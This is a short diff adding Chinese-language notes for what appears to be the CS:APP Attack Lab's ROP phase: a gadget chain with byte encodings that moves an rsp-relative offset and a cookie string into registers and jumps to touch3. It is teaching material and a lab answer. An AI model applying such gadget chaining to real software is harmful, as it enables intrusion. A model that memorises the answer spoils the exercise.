@@ -1,0 +1,14 @@
+注入一个相对rsp的offset（最后计算）和cookie字符串
+
+pop offset到rax  58
+eax->edx  89 c2
+edx->ecx  89 d1
+ecx->esi  89 ce
+
+rsp->rax  48 89 e0
+rax->rdi  48 89 c7
+
+lea (%rdi, %rsi, 1), %rax  @4019d6
+rax->rdi  48 89 c7
+
+跳转到touch3
